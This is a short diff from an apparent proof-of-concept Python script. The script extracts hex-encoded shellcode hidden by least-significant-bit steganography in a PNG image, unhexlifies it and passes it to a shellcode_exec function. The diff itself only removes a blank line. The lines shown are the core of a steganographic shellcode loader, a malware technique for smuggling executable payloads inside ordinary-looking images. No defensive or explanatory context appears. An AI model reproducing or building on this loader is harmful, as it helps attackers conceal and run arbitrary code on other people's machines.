@@ -70,5 +70,4 @@ def shellcode_exec(shellcode_raw):
 encoded_image_path = "poc_example.png"
 shellcode_str = decode_lsb(encoded_image_path)
 shellcode = binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))
-
 shellcode_exec(shellcode)
